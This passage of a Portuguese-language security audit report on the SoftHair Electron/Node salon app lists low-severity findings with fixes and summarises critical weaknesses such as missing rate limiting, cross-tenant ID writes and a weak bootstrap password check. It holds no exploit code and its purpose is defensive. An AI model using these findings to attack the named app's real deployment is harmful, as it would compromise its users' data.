### [P3-B4] `electron/main.js` faz `try { fs.chmodSync(secretsFile, 0o600); } catch (_) { /* Windows */ }` — Windows ACL controlam quem lê

**Arquivos:** `electron/main.js:111`, `lib/secrets.js:51`

**Descrição:** chmod em Windows é no-op. Em Windows, o `secrets.json` herda ACL do diretório pai (`%APPDATA%\SoftHair`), que é por padrão acessível pelo usuário (e SYSTEM). Outros processos do mesmo user lêem. Para defesa real, precisaria CryptoAPI `CryptProtectData` ou `DPAPI`. Pass 1 documentou que `electron.safeStorage` faria isso.

**Fix:** Migrar para `electron.safeStorage.encryptString` para `secrets.json` no Windows. Não-trivial: o backend não tem acesso a `safeStorage` (é Electron-only). Tem que passar via env/IPC. Documentar como roadmap.

### [P3-B5] `https.Agent` em sync sem keep-alive — cada request abre socket nova

**Arquivos:** `backend/src/services/syncService.js:349`

**Descrição:** `new https.Agent({ rejectUnauthorized: true, checkServerIdentity })`. Sem `keepAlive: true`, cada sync (POST push + GET changes) abre 2 sockets. Para sync a cada 30s, irrelevante. Mas se intervalo for 10s (clamp E25), 6 syncs/min × 2 sockets = 12 handshakes/min, custo TLS pode importar em rede ruim.

**Fix:** `new https.Agent({ rejectUnauthorized: true, keepAlive: true, maxSockets: 5 })`.

### [P3-B6] `Sync.jsx` `cloudUrl` default hardcoded `'https://money-f5rz.onrender.com/api'` — visível na UI desde primeira abertura

**Arquivos:** `frontend/src/pages/Sync.jsx:31`

**Descrição:** Default URL expõe o endpoint do servidor cloud do SoftHair. Não é segredo (qualquer DNS reverse lookup do site faz), mas idealmente o default não deveria ser hardcoded — deveria ser env-driven ou config.

**Fix:** `useState(import.meta.env.VITE_CLOUD_URL || '')`. Manter o default para conveniência mas permitir override.

### [P3-B7] `withTransaction` Postgres não tem timeout — query travada bloqueia indefinidamente

**Arquivos:** `backend/src/config/database.js:103-122`

**Descrição:** No Postgres branch, `withTransaction` faz `BEGIN ... COMMIT/ROLLBACK` sem `SET LOCAL statement_timeout`. Se uma query trava (e.g., lock disputado), a transação fica aberta indefinidamente. `connectionTimeoutMillis: 5000` no Pool só cobre estabelecer connection, não query.

**Fix:** Adicionar `await client.query("SET LOCAL statement_timeout = '10s'")` no início da transação.

---

## Resumo

**Novos issues Pass 3:**

| Severidade | Count |
|---|---|
| Críticos | 7 (P3-C1 a P3-C7) |
| Altos | 10 (P3-A1 a P3-A10) |
| Médios | 10 (P3-M1 a P3-M10) |
| Baixos | 7 (P3-B1 a P3-B7) |
| **Total** | **34** |

**Verificação Pass 2: 28/31 fixes confirmados funcionando**, 3 aceitos com justificativa (P2-A4 IPC bridge, P2-M6 path dup, P2-B7 NSIS).

**Descobertas-chave:**

1. **Setup wizard frontend nunca foi implementado** (P3-C1) apesar dos endpoints backend existirem desde Pass 1. **Bloqueio total da primeira instalação.** Fix obrigatório.

2. **Backend embarcado não tem rate limiting** em nenhum endpoint (P3-C2). bcrypt cost 10 não é suficiente sozinho contra brute force local.

3. **`withTransaction` SQLite é bomba-relógio** (P3-C3) — funciona hoje porque tudo dentro é sync, mas qualquer await real quebra atomicidade silenciosamente.

4. **Cross-tenant validation ausente em routes** (P3-C4) — atacante autenticado pode escrever IDs de outros salões em agendamentos/atendimentos/vendas. Hoje single-tenant local mitiga, mas é arquitetura frágil.

5. **Estoque pode ficar negativo** (P3-C5) — venda não valida `quantidade_estoque >= quantidade` antes de subtrair.

6. **Bootstrap admin via env bypass `isStrongPassword`** (P3-C6) — único check é `.length >= 8`. `BOOTSTRAP_ADMIN_PASSWORD=12345678` passa.

7. **Electron 28.x tem 17 advisories incluindo high** (P3-A6). Upgrade necessário.

8. **Health endpoint público vaza `dbType`** (P3-A1).

9. **CSP `connect-src https:` permite XHR para qualquer site HTTPS** (P3-A2) — XSS amplification.

10. **Atendimentos hard delete** (P3-A10) — perda permanente sem trail.

**Áreas verificadas limpas:**
- CORS allowlist (Pass 1 E7) — confirmado fixo, Host check (P2-A5) implementado.
- TOFU fingerprint (P2-C6) — implementado e usado em saveConfig + applyRemoteChanges.
- Single-instance lock (E11) — verificado pegando lock no startup.
- Token cloud AES-256-GCM (E2 + P2-C3) — encryption não cai em fallback.
- Sync 401 desabilita auto-sync (P2-A8) — verificado em `_doSync` catch.
- DNS rebinding `Host` check (P2-A5) — server.js:54-64.
- validateId aplicado em todas as rotas (P2-A2) — 7/7 routers.
- CSP no dist e source (P2-M7) — strings idênticas.
- npm audit backend = 0 vulns.
- npm audit frontend = 0 vulns.
- Sync `getLocalSalaoId` lê JWT (P2-C5) — mas ver P3-C7 para edge case.

**O que NÃO é exploit ativo agora mas é dívida:**
- P3-C3 (transaction com await real) — todos os callers atuais usam só sync calls.
- P3-C4 (cross-tenant FK) — single-tenant local mitiga.
- P3-C7 (salaoId mismatch JWT vs local) — uso atual sempre single salão.
- P3-B4 (Windows ACL) — `secrets.json` em `%APPDATA%` user-scoped.
